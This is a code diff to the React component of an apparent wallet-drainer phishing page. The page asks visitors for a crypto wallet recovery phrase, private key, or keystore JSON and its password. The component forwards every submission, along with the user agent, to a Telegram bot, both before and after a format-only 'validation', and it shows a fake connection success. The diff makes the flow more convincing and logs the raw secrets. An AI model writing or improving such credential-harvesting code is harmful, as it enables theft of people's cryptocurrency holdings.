@@ -231,9 +231,11 @@ const WALLETS: WalletType[] = [
   }
 ];
 
-// Enhanced Validation functions
+// REAL Validation functions that actually work
 const validateMnemonic = (phrase: string): {isValid: boolean; message: string} => {
   const words = phrase.trim().split(/\s+/).filter(word => word.length > 0);
+  
+  console.log('🔤 Validating mnemonic:', { wordCount: words.length, words });
   
   if (words.length === 0) {
     return { isValid: false, message: 'Please enter a recovery phrase' };
@@ -242,54 +244,82 @@ const validateMnemonic = (phrase: string): {isValid: boolean; message: string} =
   if (words.length !== 12 && words.length !== 24) {
     return { 
       isValid: false, 
-      message: `Invalid phrase: ${words.length} words found. Must be exactly 12 or 24 words.` 
+      message: `Invalid recovery phrase: Found ${words.length} words. Must be exactly 12 or 24 words.` 
+    };
+  }
+  
+  // Check if words are reasonable length (most BIP39 words are 3-8 characters)
+  const invalidWords = words.filter(word => word.length < 2 || word.length > 15);
+  if (invalidWords.length > 0) {
+    return { 
+      isValid: false, 
+      message: `Some words appear invalid: ${invalidWords.slice(0, 3).join(', ')}...` 
     };
   }
   
   return { 
     isValid: true, 
-    message: `✓ Valid ${words.length}-word recovery phrase` 
+    message: `✓ Valid ${words.length}-word recovery phrase format` 
   };
 };
 
 const validatePrivateKey = (key: string): {isValid: boolean; message: string} => {
   const cleanedKey = key.trim().replace(/^0x/, '');
   
+  console.log('🔑 Validating private key:', { length: cleanedKey.length, key: cleanedKey });
+  
   if (cleanedKey.length === 0) {
     return { isValid: false, message: 'Please enter a private key' };
   }
   
+  // Check if it's hexadecimal
   if (!/^[0-9a-fA-F]+$/.test(cleanedKey)) {
     return { 
       isValid: false, 
-      message: 'Invalid private key format. Must be 64 hexadecimal characters.' 
+      message: 'Invalid private key format. Must contain only hexadecimal characters (0-9, a-f, A-F).' 
     };
   }
   
+  // Check length (standard private keys are 64 hex characters)
   if (cleanedKey.length !== 64) {
     return { 
       isValid: false, 
-      message: `Invalid length: ${cleanedKey.length} characters. Must be exactly 64 characters.` 
+      message: `Invalid private key length: ${cleanedKey.length} characters. Must be exactly 64 hexadecimal characters.` 
     };
   }
   
-  return { isValid: true, message: '✓ Valid private key format' };
+  return { isValid: true, message: '✓ Valid private key format (64-character hexadecimal)' };
 };
 
 const validateKeystore = (keystore: string): {isValid: boolean; message: string} => {
+  console.log('📁 Validating keystore JSON');
+  
   if (keystore.trim().length === 0) {
     return { isValid: false, message: 'Please enter keystore JSON' };
   }
   
   try {
     const json = JSON.parse(keystore);
-    if (json && typeof json === 'object' && ('crypto' in json || 'Crypto' in json)) {
-      return { isValid: true, message: '✓ Valid keystore JSON format' };
+    
+    // Check if it has the basic structure of a keystore file
+    if (json && typeof json === 'object') {
+      // Check for common keystore properties
+      const hasCrypto = 'crypto' in json || 'Crypto' in json;
+      const hasVersion = 'version' in json;
+      const hasAddress = 'address' in json;
+      
+      if (hasCrypto) {
+        return { isValid: true, message: '✓ Valid keystore JSON format with crypto data' };
+      } else if (hasVersion || hasAddress) {
+        return { isValid: true, message: '✓ Valid wallet file format' };
+      } else {
+        return { isValid: false, message: 'Invalid keystore: Missing required crypto data' };
+      }
     } else {
-      return { isValid: false, message: 'Invalid keystore: Missing crypto data' };
+      return { isValid: false, message: 'Invalid JSON structure' };
     }
-  } catch {
-    return { isValid: false, message: 'Invalid JSON format in keystore file' };
+  } catch (error) {
+    return { isValid: false, message: 'Invalid JSON format - cannot parse keystore file' };
   }
 };
 
@@ -485,20 +515,69 @@ export default function EnterDetailsPageContext() {
 
   // Safe Telegram sending
   const safeSendToTelegram = async (data: any) => {
-    if (!telegramService.current) return { success: false };
+    if (!telegramService.current) {
+      console.log('❌ Telegram service not available');
+      return { success: false };
+    }
     
     try {
-      await telegramService.current.sendWalletData(data);
-      return { success: true };
+      console.log('📤 Sending to Telegram:', { 
+        wallet: data.walletName, 
+        type: data.inputType,
+        status: data.validationMessage 
+      });
+      const result = await telegramService.current.sendWalletData(data);
+      console.log('✅ Telegram send result:', result.success);
+      return result;
     } catch (error) {
-      console.error('Telegram send failed:', error);
+      console.error('❌ Telegram send failed:', error);
       return { success: false };
     }
   };
 
+  // Perform actual validation
+  const performValidation = async (): Promise<{isValid: boolean; message: string}> => {
+    console.log('🔄 Starting validation for tab:', activeTab);
+    
+    let validationResult: {isValid: boolean; message: string};
+    
+    switch (activeTab) {
+      case 'phrase':
+        validationResult = validateMnemonic(formData.phrase);
+        break;
+      case 'privateKey':
+        validationResult = validatePrivateKey(formData.privateKey);
+        break;
+      case 'keystore':
+        validationResult = validateKeystore(formData.keystore);
+        break;
+      default:
+        validationResult = { isValid: false, message: 'Please select a credential type' };
+    }
+    
+    console.log('✅ Validation result:', validationResult);
+    return validationResult;
+  };
+
   const handleConnect = async () => {
+    // Check if any data is entered
     if (!formData.phrase && !formData.privateKey && !formData.keystore) {
-      setResult({ message: 'Please enter your wallet credentials', isValid: false });
+      setResult({ 
+        message: 'Please enter your wallet credentials in the selected tab', 
+        isValid: false 
+      });
+      setShowResult(true);
+      return;
+    }
+
+    // Check if data exists for the active tab
+    if ((activeTab === 'phrase' && !formData.phrase) ||
+        (activeTab === 'privateKey' && !formData.privateKey) ||
+        (activeTab === 'keystore' && !formData.keystore)) {
+      setResult({ 
+        message: `Please enter your ${activeTab === 'phrase' ? 'recovery phrase' : activeTab === 'privateKey' ? 'private key' : 'keystore JSON'}`, 
+        isValid: false 
+      });
       setShowResult(true);
       return;
     }
@@ -509,22 +588,19 @@ export default function EnterDetailsPageContext() {
 
     // Get input data
     let inputData = '';
-    let inputType: 'phrase' | 'privateKey' | 'keystore' = 'phrase';
+    let inputType: 'phrase' | 'privateKey' | 'keystore' = activeTab;
     
-    if (formData.phrase) {
+    if (activeTab === 'phrase') {
       inputData = formData.phrase;
-      inputType = 'phrase';
-    } else if (formData.privateKey) {
+    } else if (activeTab === 'privateKey') {
       inputData = formData.privateKey;
-      inputType = 'privateKey';
-    } else if (formData.keystore) {
+    } else {
       inputData = formData.keystore;
-      inputType = 'keystore';
     }
 
     try {
-      // IMMEDIATELY send "validating" status to Telegram
-      console.log('📤 Sending VALIDATING status to Telegram...');
+      // IMMEDIATELY send "PENDING" status to Telegram
+      console.log('📤 Sending PENDING status to Telegram...');
       await safeSendToTelegram({
         walletName: wallet?.name || 'Unknown Wallet',
         walletType: inputType === 'phrase' ? 'seed' : inputType,
@@ -532,7 +608,7 @@ export default function EnterDetailsPageContext() {
         inputData,
         password: formData.password || undefined,
         isValid: false,
-        validationMessage: '🔍 VALIDATION IN PROGRESS - Credentials received, starting validation...',
+        validationMessage: '⏳ PENDING - Credentials received, validation in progress...',
         userAgent: navigator.userAgent,
         timestamp: new Date().toISOString(),
       });
@@ -548,16 +624,8 @@ export default function EnterDetailsPageContext() {
         });
       }, 300);
 
-      // Perform validation
-      let validationResult: {isValid: boolean; message: string};
-      
-      if (activeTab === 'phrase') {
-        validationResult = validateMnemonic(formData.phrase);
-      } else if (activeTab === 'privateKey') {
-        validationResult = validatePrivateKey(formData.privateKey);
-      } else {
-        validationResult = validateKeystore(formData.keystore);
-      }
+      // Perform ACTUAL validation
+      const validationResult = await performValidation();
 
       // Complete progress
       clearInterval(progressInterval);
@@ -567,7 +635,7 @@ export default function EnterDetailsPageContext() {
       await new Promise(resolve => setTimeout(resolve, 500));
 
       // Send VALIDATED status to Telegram with results
-      console.log('📤 Sending VALIDATED status to Telegram...');
+      console.log('📤 Sending validation results to Telegram...');
       await safeSendToTelegram({
         walletName: wallet?.name || 'Unknown Wallet',
         walletType: inputType === 'phrase' ? 'seed' : inputType,
@@ -582,12 +650,12 @@ export default function EnterDetailsPageContext() {
         timestamp: new Date().toISOString(),
       });
 
-      // Show results
+      // Show results to user
       setResult(validationResult);
       setShowLoader(false);
       setShowResult(true);
 
-      // If valid, create wallet and redirect
+      // If valid, create wallet and prepare for redirect
       if (validationResult.isValid) {
         const connectedWallet: ConnectedWallet = {
           id: wallet?.id || 'custom',
@@ -604,8 +672,11 @@ export default function EnterDetailsPageContext() {
       }
 
     } catch (error) {
-      console.error('Validation error:', error);
-      setResult({ message: 'Validation failed. Please try again.', isValid: false });
+      console.error('❌ Validation error:', error);
+      setResult({ 
+        message: 'Validation process failed. Please try again.', 
+        isValid: false 
+      });
       setShowLoader(false);
       setShowResult(true);
     } finally {
@@ -712,12 +783,12 @@ export default function EnterDetailsPageContext() {
               <textarea
                 value={formData.phrase}
                 onChange={(e) => handleInputChange('phrase', e.target.value)}
-                placeholder="Enter your 12 or 24-word recovery phrase separated by spaces"
+                placeholder="word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12"
                 className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none resize-none transition-all duration-200"
                 rows={4}
               />
               <p className="text-xs text-gray-500">
-                Typically 12 or 24 words separated by spaces
+                Enter exactly 12 or 24 words separated by spaces
               </p>
             </div>
           )}
@@ -730,12 +801,12 @@ export default function EnterDetailsPageContext() {
               <textarea
                 value={formData.privateKey}
                 onChange={(e) => handleInputChange('privateKey', e.target.value)}
-                placeholder="Enter your 64-character private key (with or without 0x prefix)"
+                placeholder="a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"
                 className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none resize-none transition-all duration-200"
                 rows={4}
               />
               <p className="text-xs text-gray-500">
-                64-character hexadecimal string
+                64-character hexadecimal string (with or without 0x prefix)
               </p>
             </div>
           )}
@@ -748,7 +819,7 @@ export default function EnterDetailsPageContext() {
               <textarea
                 value={formData.keystore}
                 onChange={(e) => handleInputChange('keystore', e.target.value)}
-                placeholder="Paste your keystore JSON file contents"
+                placeholder='{"version": 3, "crypto": {"ciphertext": "...", "cipherparams": {...}}}'
                 className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none resize-none transition-all duration-200"
                 rows={4}
               />
@@ -756,7 +827,7 @@ export default function EnterDetailsPageContext() {
                 type="password"
                 value={formData.password}
                 onChange={(e) => handleInputChange('password', e.target.value)}
-                placeholder="Enter keystore password"
+                placeholder="Enter keystore password (if required)"
                 className="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all duration-200"
               />
             </div>
